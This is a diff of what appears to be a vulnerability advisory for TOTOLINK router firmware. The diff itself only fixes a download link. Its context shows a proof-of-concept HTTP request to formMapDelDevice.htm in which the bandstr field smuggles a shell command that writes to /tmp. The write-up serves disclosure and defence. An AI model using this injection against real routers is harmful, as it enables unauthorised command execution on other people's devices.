@@ -9,7 +9,7 @@
 
 **version**:V4.0.0-B20230531.1404
 
-The firmware can be downloaded from this website[1] 
+The firmware can be downloaded from this website[][1]
 ## detail
 
 **addr**:0045a2a4
@@ -52,4 +52,5 @@ Upgrade-Insecure-Requests: 1
 sessionCheck=5ef3b954a1316eeedf1d36330046c0ca&submit-url=%2FformMapDelDevice.htm&macstr=123&clientoff=no&bandstr=123;echo%20123456%20>/tmp/rec1.txt
 ```
 ![alt text](./img/image.png)
+
 [1]:https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/258/ids/36.html
